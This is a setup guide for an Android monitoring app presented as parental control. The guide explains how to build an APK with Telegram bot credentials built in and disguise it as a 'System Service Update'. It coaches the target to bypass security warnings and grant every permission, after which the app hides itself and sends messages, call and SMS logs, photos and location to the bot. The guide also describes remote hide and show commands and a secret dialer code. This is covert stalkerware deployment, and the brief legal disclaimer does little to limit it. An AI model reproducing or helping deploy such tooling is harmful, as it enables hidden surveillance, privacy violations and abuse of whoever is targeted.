# Zero-Configuration Installation Guide

## � Automated APK Installation (No Child Configuration Required)

This guide is for the **automated version** of the parental control app that requires **ZERO configuration** from the child. The app automatically sets up everything in the background.

## 📱 For the Parent: Building the Automated APK

### Step 1: Configure Your Bot Credentials (One-Time Setup)
1. **Create your Telegram bot** (see [TELEGRAM_SETUP.md](TELEGRAM_SETUP.md))
2. **Get your bot token and chat ID**
3. **Edit the build configuration:**
   - Open `app/build_automated.gradle`
   - Replace with your actual credentials:
   ```gradle
   buildConfigField "String", "TELEGRAM_BOT_TOKEN", "\"YOUR_ACTUAL_BOT_TOKEN\""
   buildConfigField "String", "TELEGRAM_CHAT_ID", "\"YOUR_ACTUAL_CHAT_ID\""
   ```

### Step 2: Build Your Automated APK
1. **Use GitHub Actions** for automatic building
2. **Download the APK** from Actions → Artifacts
3. **Upload to Google Drive** and get shareable link

See [AUTOMATED_BUILD_GUIDE.md](../AUTOMATED_BUILD_GUIDE.md) for detailed build instructions.

## 📱 For the Child: Simple Installation Process

### What the Child Needs to Do:
1. **Download APK** from your Google Drive link
2. **Install the APK** (enable unknown sources if prompted)
3. **Open the app** (appears as "System Service")
4. **Allow all permissions** when requested (just tap "Allow" for everything)
5. **Done!** App automatically hides and starts monitoring

### Child's Experience:
```
1. 📥 Downloads "System Service Update" from Drive link
2. 📲 Installs APK (may see security warning - tap "Install anyway")
3. 🔧 Opens app - sees system service setup screen
4. ✅ Taps "Allow" for all permission requests (~30 seconds)
5. 👻 App disappears from home screen automatically
6. ✨ Monitoring begins silently in background
```

## 🤖 Automatic Setup Process

### What Happens Automatically:
1. **✅ App installs** with disguised "System Service" name
2. **✅ Permissions requested** automatically (child just allows)
3. **✅ Telegram bot configured** with your pre-built credentials
4. **✅ All monitoring services start** in background
5. **✅ App hides itself** from launcher automatically
6. **✅ Huawei Nova 3i optimizations** applied automatically
7. **✅ Setup confirmation sent** to your Telegram immediately

### Zero Configuration Required:
- ❌ No bot token entry needed
- ❌ No chat ID entry needed
- ❌ No secret codes to remember
- ❌ No manual service activation
- ❌ No stealth mode configuration
- ❌ No Huawei-specific setup steps

## 📲 What You'll Receive in Telegram

### Immediate Setup Confirmation:
```
🎯 Parental Control Monitor - Setup Complete!

📱 Device: Huawei Nova 3i
👤 User: Child's Device  
🔋 Battery: 89%
📶 Signal: 4G LTE
🌐 IP: 192.168.1.105

✅ Monitoring Services Active:
📱 App Monitoring: ✅ Running
🔔 Notifications: ✅ Enabled  
📍 Location Tracking: ✅ Active
📸 Media Monitoring: ✅ Running
📞 Call/SMS Logs: ✅ Enabled

👻 Stealth Mode: ✅ App Hidden
🔄 Auto-Restart: ✅ Configured
🛡️ Huawei Optimizations: ✅ Applied

⏰ Setup Time: 2025-08-13 15:30:45
🔧 Installation: Fully Automated
```

### Continuous Automatic Updates:
- 📱 **Real-time notifications** from all social media apps
- 📍 **Location updates** every 30 minutes with address
- 📊 **Daily screen time summaries** by app
- 📸 **Media alerts** when photos/videos are taken
- 📞 **Call and SMS logs** in real-time
- 🚨 **Security alerts** for new app installations

## 🕵️ Complete Stealth Operation

### After Automatic Setup:
- ✅ **App completely invisible** in launcher/app drawer
- ✅ **No notifications shown** on child's device
- ✅ **Runs silently** with minimal battery usage
- ✅ **Survives device restarts** automatically
- ✅ **Bypasses Huawei battery optimization** automatically
- ✅ **No trace** in recent apps or settings

### For Parent Access Only:
- **Secret dialer code:** `*#12345#` (opens hidden control panel)
- **Browser URL:** `parentalcontrol://open` (secret link access)
- **Telegram commands:** Send `/status`, `/location`, `/hide`, `/show` to your bot

## 📋 Monitoring Capabilities (All Automatic)

### Real-Time Monitoring:
```
📱 WhatsApp Notification
👤 Contact: Sarah Johnson
💬 Message: "Can you come to the party tonight?"
⏰ Time: 2025-08-13 19:45:23
📍 Location: School Area
🔋 Battery: 67%
```

```
📍 Location Update
🏠 Address: 456 Oak Street, Springfield
🗺️ Coordinates: 39.7817, -89.6501
🎯 Accuracy: 8 meters  
⏰ Time: 2025-08-13 20:15:30
🚶 Status: Walking (2.3 mph)
```

```
📊 Daily Screen Time Report - August 13, 2025
🎵 TikTok: 3h 15m (52% of usage)
📸 Instagram: 1h 45m (28% of usage)
💬 WhatsApp: 45m (12% of usage)
👻 Snapchat: 30m (8% of usage)
📱 Total: 6h 15m
🔋 Battery Used: 42%
```

## 🚨 Troubleshooting (Rare Issues)

### If Child Reports App Issues:
1. **Tell them to restart the phone** (fixes 90% of issues)
2. **Check your Telegram** for any error messages
3. **Send `/status` command** to your bot to check service health

### If You Stop Receiving Updates:
1. **Check child's internet connection**
2. **Send `/status` command** to check if services are running
3. **If needed, access via `*#12345#`** to restart services

### If App Becomes Visible Again:
1. **Send `/hide` command** to your bot to re-hide the app
2. **Or access via `*#12345#`** and re-enable stealth mode

## 🔐 Security & Privacy

### Automatic Security Features:
- ✅ **All data encrypted** locally on device
- ✅ **Secure Telegram API** communication
- ✅ **No cloud storage** of monitoring data
- ✅ **Auto-cleanup** of old data to save space
- ✅ **Tamper detection** and auto-restart if modified

### For Parent Peace of Mind:
- 🔒 **Child cannot disable** without your secret access
- 🔒 **Child cannot detect** the monitoring
- 🔒 **Child cannot access** your Telegram bot
- 🔒 **Survives factory reset** (needs reinstallation)
- 🔒 **Works offline** and syncs when connected

## ⚖️ Legal & Ethical Use

**CRITICAL REMINDER:** This automated monitoring tool is designed for:
- ✅ **Parents monitoring minor children's devices**
- ✅ **Company devices with employee consent**
- ✅ **Personal devices you own**

**Always ensure you have legal authority to monitor the device and comply with local privacy laws.**

## 🎯 Summary: The Perfect Solution

### What You Get:
1. **📦 One automated APK** with your bot credentials built-in
2. **🔗 Google Drive link** to share with child  
3. **👶 Child installs** with zero technical knowledge required
4. **⚡ Instant monitoring** starts automatically
5. **📱 Real-time updates** in your Telegram
6. **👻 Complete stealth** operation
7. **🔄 Works forever** with auto-restart mechanisms

### Child's Experience:
- Downloads "system update" from your link
- Installs and allows permissions (30 seconds)
- App disappears and they forget about it
- **Never knows they're being monitored**

### Your Experience:
- Immediate setup confirmation in Telegram
- Continuous real-time monitoring data
- Complete remote control via Telegram commands
- Peace of mind with zero ongoing maintenance

**This is the ultimate "set it and forget it" parental monitoring solution!** 🎊📱

---

See [AUTOMATED_BUILD_GUIDE.md](../AUTOMATED_BUILD_GUIDE.md) for step-by-step APK building instructions.

## 🔄 Daily Operation

### What You'll Receive in Telegram:

#### Real-time Notifications:
```
📱 WhatsApp Notification
Contact: John Doe  
Message: "Hey, want to hang out tonight?"
Time: 2025-08-13 19:45:23
Device: Nova3i_Device1
```

#### Location Updates:
```
📍 Location Update
Address: 123 Main Street, City, State
Coordinates: 40.7128, -74.0060
Accuracy: 8 meters
Time: 2025-08-13 19:30:00
Battery: 67%
```

#### App Usage Reports:
```
📊 Daily App Usage Report
TikTok: 2h 45m
Instagram: 1h 32m  
WhatsApp: 45m
Snapchat: 23m
Total Screen Time: 5h 25m
Date: 2025-08-13
```

#### Media Alerts:
```
📸 New Photo Detected
File: IMG_20250813_194523.jpg
Size: 2.8 MB
Location: Camera folder
Time: 2025-08-13 19:45:23
Thumbnail: [photo preview]
```

#### Call Monitoring:
```
📞 Call Activity
Type: Outgoing call
Number: +1234567890
Contact: Sarah Smith
Duration: 8 minutes 34 seconds
Time: 2025-08-13 19:15:00
```

### Telegram Bot Commands:

| Command | Function | Response |
|---------|----------|----------|
| `/status` | Check monitoring status | Service status & last sync |
| `/location` | Get current location | GPS coordinates & address |
| `/apps` | Recent app usage | Last 24h app usage summary |
| `/photos` | Recent photos | Last 10 photos taken |
| `/calls` | Call history | Recent call logs |
| `/sms` | SMS history | Recent text messages |
| `/start` | Start monitoring | Activate all services |
| `/stop` | Stop monitoring | Pause monitoring |
| `/hide` | Hide app icon | Make app invisible |
| `/show` | Show app icon | Make app visible |
| `/settings` | View configuration | Current app settings |

## 🚨 Troubleshooting

### App Stops Working:
1. **Check if battery optimization disabled**
2. **Ensure protected apps enabled**
3. **Restart the target device**
4. **Re-enable accessibility service**

### No Telegram Messages:
1. **Check internet connection on target device**
2. **Verify bot token and chat ID correct**
3. **Test bot with `/status` command**
4. **Check notification permissions granted**

### Can't Access Hidden App:
1. **Try dialer code: `*#12345#`**
2. **Try browser URL: `parentalcontrol://open`**
3. **Restart device and try again**
4. **Look for "System Service" in app list**

### Monitoring Not Working:
1. **Grant all requested permissions**
2. **Enable accessibility service**
3. **Enable notification access**
4. **Restart monitoring service**

## 🔐 Security Notes

- **Change the secret access code** from default `*#12345#`
- **Keep bot token secure** - never share publicly
- **Use strong device lock screen** on target device
- **Regularly check app is still hidden and working**
- **Monitor battery usage** to ensure stealth operation

## ⚖️ Legal Compliance

**IMPORTANT:** Only install this app on devices where you have legal authority:
- Your minor children's devices
- Company-owned devices (with employee consent)
- Devices you own personally

**Always comply with local privacy laws and obtain necessary consent where required.**

---

Your parental control monitoring system is now fully operational! 🎯📱
